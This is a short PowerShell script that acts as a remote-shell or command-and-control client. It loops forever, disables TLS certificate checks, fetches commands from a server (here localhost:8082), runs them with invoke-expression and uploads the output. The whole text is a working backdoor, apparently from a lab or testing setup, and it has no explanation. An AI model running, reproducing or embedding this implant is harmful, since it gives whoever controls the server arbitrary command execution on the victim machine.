$server = "https://127.0.0.1:8082"
while($true)
{
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$result = (New-Object Net.WebClient).DownloadString("$server/fetch")
while($result) {
	$output = invoke-expression $result | out-string 
	$resp = (New-Object System.Net.WebClient).UploadString("$server/response", $output)	
	break
}
}
